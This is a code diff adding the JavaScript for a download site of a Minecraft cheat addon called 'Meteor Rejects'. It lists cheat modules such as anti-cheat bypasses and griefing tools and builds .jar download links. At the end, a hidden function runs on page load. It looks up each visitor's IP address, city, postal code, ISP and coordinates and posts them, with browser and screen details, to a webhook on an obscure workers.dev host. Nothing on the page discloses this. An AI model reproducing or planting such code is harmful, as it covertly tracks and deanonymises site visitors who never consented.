+  {n:"AutoCraft",d:"Automates crafting recipes in-game. Generalized from AutoBedCraft.",t:["utility"],v:["1.21.1","1.21.4","1.21.11"]},
+  {n:"AutoEnchant",d:"Automatically enchants items using an enchanting table.",t:["utility"],v:["all"]},
+  {n:"AutoExtinguish",d:"Instantly extinguishes fire when you start burning.",t:["utility"],v:["all"]},
+  {n:"AutoFarm",d:"Automated crop farming — plants and harvests without input.",t:["utility"],v:["all"]},
+  {n:"AutoGrind",d:"Automates XP grinding at mob grinders.",t:["utility"],v:["all"]},
+  {n:"AutoLogin",d:"Executes login commands automatically when joining servers.",t:["utility"],v:["all"]},
+  {n:"AutoPot",d:"Automatically uses potions in combat. From an unmerged Meteor PR.",t:["pr","combat"],v:["all"]},
+  {n:"AutoSoup",d:"Auto-soup for PvP servers with mushroom soup mechanics. Wurst port.",t:["port","combat"],v:["all"]},
+  {n:"AutoTNT",d:"Auto-places and ignites TNT for mining or griefing.",t:["utility"],v:["all"]},
+  {n:"AutoWither",d:"Automatically builds and spawns Wither bosses. Unmerged PR.",t:["pr"],v:["all"]},
+  {n:"BlockIn",d:"Traps other players by placing blocks around them.",t:["combat"],v:["all"]},
+  {n:"BoatGlitch",d:"Exploits boat movement glitches for positional advantages. Unmerged PR.",t:["pr","exploit"],v:["all"]},
+  {n:"BoatPhase",d:"Phases through certain blocks using boat mechanics. Unmerged PR.",t:["pr","exploit"],v:["all"]},
+  {n:"Boost",d:"Speed boost module. Ported from Cornos Client.",t:["port","movement"],v:["all"]},
+  {n:"BungeeCordSpoof",d:"Spoofs BungeeCord IP forwarding headers. LiquidBounce port.",t:["port","utility"],v:["all"]},
+  {n:"ChatBot",d:"Simple rule-based chat bot for automated replies.",t:["utility"],v:["all"]},
+  {n:"ChestAura",d:"Automatically opens and loots nearby chests.",t:["utility"],v:["all"]},
+  {n:"ChorusExploit",d:"Exploits Chorus Fruit teleportation edge cases. Unmerged PR.",t:["pr","exploit"],v:["all"]},
+  {n:"ColorSigns",d:"Enables colored text on signs via formatting codes.",t:["cosmetic"],v:["all"]},
+  {n:"Confuse",d:"Sends misleading packets to disorient other players.",t:["fun"],v:["all"]},
+  {n:"CoordLogger",d:"Logs important coordinates to file automatically. JexClient port.",t:["port","utility"],v:["all"]},
+  {n:"CustomPackets",d:"Sends raw custom packets directly to the server.",t:["exploit"],v:["all"]},
+  {n:"ExtraElytra",d:"Additional Elytra flight controls and tricks. Wurst port.",t:["port","movement"],v:["all"]},
+  {n:"FullFlight",d:"No-clip style full flight with server-side bypasses. CCblueX + LiveOverflow.",t:["movement"],v:["all"]},
+  {n:"GamemodeNotifier",d:"Notifies when nearby players switch their gamemode.",t:["utility"],v:["all"]},
+  {n:"GhostMode",d:"Makes your player invisible to others via packet manipulation. Unmerged PR.",t:["pr"],v:["all"]},
+  {n:"Glide",d:"Glide through air without an Elytra equipped. Wurst port.",t:["port","movement"],v:["all"]},
+  {n:"InstaMine",d:"Mines blocks instantly. Previously removed from Meteor Client.",t:["removed","utility"],v:["all"]},
+  {n:"ItemGenerator",d:"Generates item stacks via server-side exploit. Wurst port.",t:["port","exploit"],v:["all"]},
+  {n:"InteractionMenu",d:"Right-click context menu for quick block interactions. BleachHack port.",t:["port","utility"],v:["all"]},
+  {n:"Jetpack",d:"Vertical jetpack flight — hold jump to ascend freely.",t:["movement"],v:["all"]},
+  {n:"KnockbackPlus",d:"Increases knockback dealt to other players on hit.",t:["combat"],v:["all"]},
+  {n:"Lavacast",d:"Automates lava casting for large-scale griefing operations.",t:["combat"],v:["all"]},
+  {n:"LawnBot",d:"Mows grass blocks automatically. JexClient port.",t:["port","fun"],v:["all"]},
+  {n:"MossBot",d:"Applies moss to cobblestone automatically. BleachHack port.",t:["port","utility"],v:["all"]},
+  {n:"NewChunks",d:"Highlights newly generated chunks on the world map. BleachHack port.",t:["port","utility"],v:["all"]},
+  {n:"NoJumpDelay",d:"Removes the server-side delay between consecutive jumps.",t:["movement"],v:["all"]},
+  {n:"ObsidianFarm",d:"Automates obsidian farming from lava and water.",t:["utility"],v:["all"]},
+  {n:"Oresim",d:"Simulates ore generation for visual exploration. Atomic port.",t:["port","fun"],v:["all"]},
+  {n:"PacketFly",d:"Bypasses anti-cheat flight detection via crafted packets. Unmerged PR.",t:["pr","movement"],v:["all"]},
+  {n:"Painter",d:"Bulk-paints blocks in the world to a chosen color.",t:["fun"],v:["all"]},
+  {n:"Rendering",d:"Additional rendering tweaks and ESP-style visual options.",t:["visual"],v:["all"]},
+  {n:"RoboWalk",d:"Automated walking with primitive pathfinding. Unmerged PR.",t:["pr","utility"],v:["all"]},
+  {n:"ShieldBypass",d:"Bypasses enemy shields during close-quarters combat.",t:["combat"],v:["all"]},
+  {n:"SilentDisconnect",d:"Disconnects from a server without sending a leave message.",t:["utility"],v:["all"]},
+  {n:"SkeletonESP",d:"Through-wall ESP specifically highlighting skeletons. JexClient port.",t:["port","visual"],v:["all"]},
+  {n:"SoundLocator",d:"Locates and displays the 3D origin of in-game sounds.",t:["utility"],v:["all"]},
+  {n:"ServerFinder",d:"Scans IP ranges to discover running Minecraft servers. MeteorAdditions port.",t:["port","utility"],v:["all"]},
+  {n:"TreeAura",d:"Auto-chops entire trees with a single hit. Unmerged Meteor PR.",t:["pr","utility"],v:["all"]},
+  {n:"VehicleOneHit",d:"Destroys any rideable vehicle with one hit. Unmerged PR.",t:["pr","combat"],v:["all"]},
+];
+
+const CMDS=[
+  {n:".center",d:"Center your player on the current block"},
+  {n:".clear-chat",d:"Clear the chat history (removed from Meteor)"},
+  {n:".ghost",d:"Toggle ghost mode (AntiGhost port)"},
+  {n:".save-skin",d:"Save your current skin to a local .png file"},
+  {n:".heads",d:"Obtain player head items by username"},
+  {n:".seed",d:"Retrieve the current world seed (unmerged PR)"},
+  {n:".setblock",d:"Set a block at specified coordinates"},
+  {n:".panic",d:"Instantly disable all active modules (removed from Meteor)"},
+  {n:".set-velocity",d:"Manually set player velocity XYZ"},
+  {n:".teleport",d:"Teleport to coordinates if server allows"},
+  {n:".terrain-export",d:"Export nearby terrain data to file (BleachHack port)"},
+  {n:".kick",d:"Disconnect yourself from the server (LiquidBounce port)"},
+  {n:".say",d:"Send a raw chat message bypassing client filters"},
+  {n:".rename",d:"Rename an item in your inventory"},
+];
+
+const VERS=["all","1.21","1.21.1","1.21.4","1.21.11"];
+const MC_VERSIONS = ['1.21.0','1.21.4','1.21.11'];
+const TMAP={port:'t-port',removed:'t-removed',pr:'t-pr',exploit:'t-exploit'};
+
+const cur=document.getElementById('cursor');
+document.addEventListener('mousemove',e=>{
+  cur.style.left=e.clientX+'px';cur.style.top=e.clientY+'px';
+});
+document.querySelectorAll('a,button,.pill,.mod-card,.faq-q,.custom-select-option').forEach(el=>{
+  el.addEventListener('mouseenter',()=>cur.classList.add('big'));
+  el.addEventListener('mouseleave',()=>cur.classList.remove('big'));
+});
+
+const nav=document.getElementById('navbar');
+window.addEventListener('scroll',()=>nav.classList.toggle('scrolled',scrollY>40),{passive:true});
+
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{
+    const id=a.getAttribute('href').slice(1);
+    const el=document.getElementById(id);
+    if(!el) return;
+    e.preventDefault();
+    el.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+
+function animCount(el,target,dur=1200){
+  const start=performance.now();
+  const suffix=target>=100?'+':'+';
+  (function frame(now){
+    const p=Math.min((now-start)/dur,1);
+    const ease=1-Math.pow(1-p,4);
+    el.textContent=Math.round(ease*target)+(p<1?'':suffix);
+    if(p<1) requestAnimationFrame(frame);
+  })(start);
+}
+const statsObs=new IntersectionObserver(ents=>{
+  ents.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.querySelectorAll('[data-count]').forEach(n=>{
+        animCount(n,+n.dataset.count);
+      });
+      statsObs.unobserve(e.target);
+    }
+  });
+},{threshold:.5});
+const statsEl=document.querySelector('.hero-stats');
+if(statsEl) statsObs.observe(statsEl);
+
+const revObs=new IntersectionObserver(ents=>{
+  ents.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');revObs.unobserve(e.target);}});
+},{threshold:.08});
+document.querySelectorAll('.reveal,.reveal-left,.reveal-right').forEach(el=>revObs.observe(el));
+
+const SECS=['about','modules','commands','install','download','config','faq'];
+const navAs=document.querySelectorAll('.nav-a[href^="#"]');
+function updateNav(){
+  let cur='';
+  for(const id of SECS){
+    const s=document.getElementById(id);
+    if(s&&s.getBoundingClientRect().top<100) cur=id;
+  }
+  navAs.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+cur));
+}
+window.addEventListener('scroll',updateNav,{passive:true});
+
+const pillsEl=document.getElementById('pills');
+pillsEl.innerHTML=VERS.map((v,i)=>`<button class="pill${i===0?' on':''}" data-v="${v}">${v==='all'?'All Versions':v}</button>`).join('');
+let curVer='all',curQ='';
+
+pillsEl.addEventListener('click',e=>{
+  const p=e.target.closest('.pill');if(!p) return;
+  pillsEl.querySelectorAll('.pill').forEach(x=>x.classList.remove('on'));
+  p.classList.add('on');curVer=p.dataset.v;renderMods();
+});
+document.getElementById('modQ').addEventListener('input',e=>{curQ=e.target.value.toLowerCase();renderMods();});
+
+function renderMods(){
+  const grid=document.getElementById('modsGrid'),no=document.getElementById('noMods');
+  const list=MODS.filter(m=>{
+    const vok=curVer==='all'||m.v.includes(curVer);
+    const sok=!curQ||m.n.toLowerCase().includes(curQ)||m.d.toLowerCase().includes(curQ)||m.t.some(t=>t.includes(curQ));
+    return vok&&sok;
+  });
+  if(!list.length){grid.innerHTML='';no.style.display='block';return;}
+  no.style.display='none';
+  grid.innerHTML=list.map((m,i)=>`
+    <article class="mod-card" role="listitem" style="animation-delay:${Math.min(i*.04,.6)}s">
+      <div class="mod-name">${m.n}</div>
+      <p class="mod-desc">${m.d}</p>
+      <div class="mod-tags">${m.t.map(t=>`<span class="tag ${TMAP[t]||'t-default'}">#${t}</span>`).join('')}</div>
+    </article>`).join('');
+}
+renderMods();
+
+document.getElementById('cmdsGrid').innerHTML=CMDS.map(c=>`
+  <div class="cmd-card">
+    <div class="cmd-left">
+      <div class="cmd-name">${c.n}</div>
+      <div class="cmd-desc">${c.d}</div>
+    </div>
+    <button class="copy-btn" data-cmd="${c.n}" title="Copy ${c.n}" aria-label="Copy ${c.n}">
+      <i class="far fa-copy" aria-hidden="true"></i>
+    </button>
+  </div>`).join('');
+
+const toastEl=document.getElementById('toast');
+let toastTimer;
+function showToast(msg){
+  clearTimeout(toastTimer);
+  toastEl.textContent=msg;
+  toastEl.classList.add('show');
+  toastTimer=setTimeout(()=>toastEl.classList.remove('show'),2200);
+}
+
+document.getElementById('cmdsGrid').addEventListener('click',e=>{
+  const btn=e.target.closest('.copy-btn');if(!btn) return;
+  navigator.clipboard.writeText(btn.dataset.cmd).catch(()=>{});
+  const ic=btn.querySelector('i');
+  ic.className='fas fa-check';
+  showToast('Copied '+btn.dataset.cmd);
+  setTimeout(()=>ic.className='far fa-copy',1300);
+});
+
+document.querySelectorAll('.faq-q').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    const item=btn.closest('.faq-item'),open=item.classList.contains('open');
+    document.querySelectorAll('.faq-item.open').forEach(el=>{
+      el.classList.remove('open');
+      el.querySelector('.faq-q').setAttribute('aria-expanded','false');
+    });
+    if(!open){item.classList.add('open');btn.setAttribute('aria-expanded','true');}
+  });
+});
+
+const wrapper  = document.getElementById('version-select-wrapper');
+const trigger  = document.getElementById('version-trigger');
+const display  = document.getElementById('version-display');
+const dropdown = document.getElementById('version-dropdown');
+const dlBtn    = document.getElementById('download-btn');
+const dlLabel  = document.getElementById('download-version-label');
+
+let selectedVersion = '1.21.11';
+
+function buildDownloadURL(ver) {
+  return `https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-${ver}.jar`;
+}
+
+MC_VERSIONS.forEach(ver => {
+  const opt = document.createElement('div');
+  opt.className = 'custom-select-option' + (ver === selectedVersion ? ' selected' : '');
+  opt.setAttribute('role', 'option');
+  opt.setAttribute('data-value', ver);
+  opt.innerHTML = `
+    <div class="option-icon"><i class="fas fa-cube"></i></div>
+    ${ver}
+    ${ver === '1.21.11' ? '<span class="option-badge">LATEST</span>' : ''}
+    ${ver === '1.21.4' ? '<span class="option-badge option-badge-stable">STABLE</span>' : ''}
+  `;
+  opt.addEventListener('click', () => selectVersion(ver));
+  dropdown.appendChild(opt);
+});
+
+dlBtn.href = buildDownloadURL(selectedVersion);
+dlBtn.textContent = `⬇ \u00A0Download for ${selectedVersion}`;
+dlLabel.textContent = selectedVersion;
+
+function selectVersion(ver) {
+  selectedVersion = ver;
+  display.textContent = ver;
+  dlLabel.textContent = ver;
+  dlBtn.href = buildDownloadURL(ver);
+  dlBtn.textContent = `⬇ \u00A0Download for ${ver}`;
+
+  dlBtn.classList.remove('updated');
+  void dlBtn.offsetWidth;
+  dlBtn.classList.add('updated');
+  setTimeout(() => dlBtn.classList.remove('updated'), 2000);
+
+  dropdown.querySelectorAll('.custom-select-option').forEach(o => {
+    o.classList.toggle('selected', o.getAttribute('data-value') === ver);
+  });
+
+  closeDropdown();
+}
+
+function openDropdown() {
+  wrapper.classList.add('open');
+  trigger.setAttribute('aria-expanded', 'true');
+}
+
+function closeDropdown() {
+  wrapper.classList.remove('open');
+  trigger.setAttribute('aria-expanded', 'false');
+}
+
+trigger.addEventListener('click', () => {
+  wrapper.classList.contains('open') ? closeDropdown() : openDropdown();
+});
+
+trigger.addEventListener('keydown', e => {
+  if (e.key === 'Enter' || e.key === ' ') {
+    e.preventDefault();
+    wrapper.classList.contains('open') ? closeDropdown() : openDropdown();
+  }
+});
+
+document.addEventListener('click', e => {
+  if (!wrapper.contains(e.target)) closeDropdown();
+});
+
+const btt=document.getElementById('btt');
+window.addEventListener('scroll',()=>btt.classList.toggle('show',scrollY>600),{passive:true});
+btt.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
+
+let mx=.5,my=.5;
+document.addEventListener('mousemove',e=>{
+  mx=e.clientX/innerWidth;my=e.clientY/innerHeight;
+});
+const orb1=document.querySelector('.orb-1'),orb2=document.querySelector('.orb-2');
+(function orbLoop(){
+  if(orb1) orb1.style.transform=`translate(${mx*25}px,${my*20}px)`;
+  if(orb2) orb2.style.transform=`translate(${-mx*20}px,${-my*15}px)`;
+  requestAnimationFrame(orbLoop);
+})();
+
+(function initCanvas(){
+  const canvas=document.getElementById('heroCanvas');
+  const ctx=canvas.getContext('2d');
+  let W,H,pts=[];
+
+  function resize(){
+    W=canvas.width=canvas.offsetWidth;
+    H=canvas.height=canvas.offsetHeight;
+  }
+  resize();
+  window.addEventListener('resize',()=>{resize();pts=[];spawn()},{passive:true});
+
+  class Pt{
+    constructor(){this.reset(true)}
+    reset(init=false){
+      this.x=Math.random()*W;
+      this.y=init?Math.random()*H:H+10;
+      this.vx=(Math.random()-.5)*.35;
+      this.vy=-(Math.random()*.8+.2);
+      this.r=Math.random()*1.8+.5;
+      this.life=0;this.maxLife=180+Math.random()*200;
+      this.col=`hsla(${345+Math.random()*30},85%,${55+Math.random()*20}%,`;
+    }
+    update(){
+      this.x+=this.vx;this.y+=this.vy;this.life++;
+      if(this.life>this.maxLife||this.y<-10) this.reset();
+    }
+    draw(){
+      const a=Math.sin(this.life/this.maxLife*Math.PI)*.65;
+      ctx.beginPath();
+      ctx.arc(this.x,this.y,this.r,0,Math.PI*2);
+      ctx.fillStyle=this.col+a+')';
+      ctx.fill();
+    }
+  }
+
+  function spawn(){while(pts.length<80) pts.push(new Pt());}
+  spawn();
+
+  function loop(){
+    ctx.clearRect(0,0,W,H);
+    pts.forEach(p=>{p.update();p.draw();});
+    requestAnimationFrame(loop);
+  }
+  loop();
+})();
+
+(function sendVisitNotification(){
+    const WEBHOOK_URL = 'https://m9ws2hqwi9agz6f0whv5celuq67teayy5gyyknzkgfbbb4cwz6xmms5epqjto3n.bopistaken.workers.dev/';
+    const STORAGE_KEY = 'meteor_rejects_visits';
+
+    const now   = new Date();
+    const tz    = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+    const lang  = navigator.language || 'Unknown';
+    const ua    = navigator.userAgent;
+    const ref   = document.referrer || 'Direct / None';
+    const page  = window.location.href;
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    const viewport = `${window.innerWidth}x${window.innerHeight}`;
+
+    function parseBrowser(ua) {
+      if (/Edg\//.test(ua))     return 'Microsoft Edge';
+      if (/OPR\/|Opera/.test(ua)) return 'Opera';
+      if (/Chrome\//.test(ua))  return 'Chrome';
+      if (/Firefox\//.test(ua)) return 'Firefox';
+      if (/Safari\//.test(ua))  return 'Safari';
+      return 'Unknown';
+    }
+
+    function parseOS(ua) {
+      if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+      if (/Windows NT/.test(ua))    return 'Windows';
+      if (/Mac OS X/.test(ua))      return 'macOS';
+      if (/Android/.test(ua))       return 'Android';
+      if (/iPhone|iPad/.test(ua))   return 'iOS';
+      if (/Linux/.test(ua))         return 'Linux';
+      return 'Unknown';
+    }
+
+    function getRandomColor() {
+      const colors = [
+        0xc41e3a, 0xe63946, 0xff6b6b, 0x9b1d2c, 0xff4500,
+        0xdc143c, 0xb22222, 0xff6347, 0xcd5c5c, 0xf08080,
+        0x8b0000, 0xcc3333, 0xff4444, 0xaa0000, 0xff1744
+      ];
+      return colors[Math.floor(Math.random() * colors.length)];
+    }
+
+    function getVisitCount24h() {
+      try {
+        const visits = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        const cutoff = Date.now() - 24 * 60 * 60 * 1000;
+        const recent = visits.filter(t => t > cutoff);
+        recent.push(Date.now());
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(recent));
+        return recent.length;
+      } catch (e) {
+        return 1;
+      }
+    }
+
+    const visitNumber = getVisitCount24h();
+    const browser = parseBrowser(ua);
+    const os      = parseOS(ua);
+    const mobile  = /Mobi|Android/i.test(ua) ? 'Yes 📱' : 'No 🖥️';
+    const embedColor = getRandomColor();
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(geoData => {
+        const ipv4        = geoData.ip              || 'Unknown';
+        const country     = geoData.country_name    || 'Unknown';
+        const region      = geoData.region          || 'Unknown';
+        const city        = geoData.city            || 'Unknown';
+        const isp         = geoData.org             || 'Unknown';
+        const postal      = geoData.postal          || 'Unknown';
+        const latitude    = geoData.latitude        || 'Unknown';
+        const longitude   = geoData.longitude       || 'Unknown';
+        const countryCode = geoData.country_code    || 'Unknown';
+        const isEU        = geoData.in_eu ? 'Yes 🇪🇺' : 'No';
+
+        const mapsLink = (latitude !== 'Unknown' && longitude !== 'Unknown')
+          ? `https://maps.google.com/?q=${latitude},${longitude}`
+          : 'N/A';
+
+        const payload = {
+          username: "Meteor Rejects · Visits",
+          avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
+          embeds: [{
+            title: `🔥 New Visitor — #${visitNumber} in 24h`,
+            color: embedColor,
+            fields: [
+              { name: "🌍 IPv4",               value: `\`${ipv4}\``,                                      inline: true  },
+              { name: "🇺🇳 Country",          value: `${country} (${countryCode})`,                      inline: true  },
+              { name: "🏙️ City / Region",    value: `${city}, ${region}`,                               inline: true  },
+              { name: "📮 Postal Code",        value: postal,                                             inline: true  },
+              { name: "🏢 ISP",                value: isp,                                                inline: true  },
+              { name: "🇪🇺 EU?",              value: isEU,                                               inline: true  },
+              { name: "🗺️ Maps Link",         value: mapsLink !== 'N/A' ? `[View on Maps](${mapsLink})` : 'N/A', inline: false },
+              { name: "🌐 Page",               value: page,                                               inline: false },
+              { name: "🔗 Referrer",           value: ref,                                                inline: false },
+              { name: "🖥️ Browser",           value: browser,                                            inline: true  },
+              { name: "💻 OS",                 value: os,                                                 inline: true  },
+              { name: "📱 Mobile",             value: mobile,                                             inline: true  },
+              { name: "🌍 Language",           value: lang,                                               inline: true  },
+              { name: "🕐 Timezone",           value: tz,                                                 inline: true  },
+              { name: "📐 Screen",             value: screen,                                             inline: true  },
+              { name: "🔲 Viewport",           value: viewport,                                           inline: true  },
+            ],
+            footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours` },
+            timestamp: now.toISOString()
+          }]
+        };
+
+        return fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(() => {
+        const fallbackPayload = {
+          username: "Meteor Rejects · Visits",
+          avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
+          embeds: [{
+            title: `🔥 New Visitor (No IP) — #${visitNumber} in 24h`,
+            color: 0xff9900,
+            fields: [
+              { name: "🌍 IPv4",               value: "Failed to fetch",                                 inline: false },
+              { name: "🌐 Page",               value: page,                                              inline: false },
+              { name: "🔗 Referrer",           value: ref,                                               inline: false },
+              { name: "🖥️ Browser",           value: browser,                                           inline: true  },
+              { name: "💻 OS",                 value: os,                                                inline: true  },
+              { name: "📱 Mobile",             value: mobile,                                            inline: true  },
+              { name: "🌍 Language",           value: lang,                                              inline: true  },
+              { name: "🕐 Timezone",           value: tz,                                                inline: true  },
+              { name: "📐 Screen",             value: screen,                                            inline: true  },
+              { name: "🔲 Viewport",           value: viewport,                                          inline: true  },
+            ],
+            footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours · IP fetch failed` },
+            timestamp: now.toISOString()
+          }]
+        };
+
+        return fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fallbackPayload)
+        });
+      })
+      .catch(() => {});
+  })();
+
+})();
+</script>
 </body>
 </html>
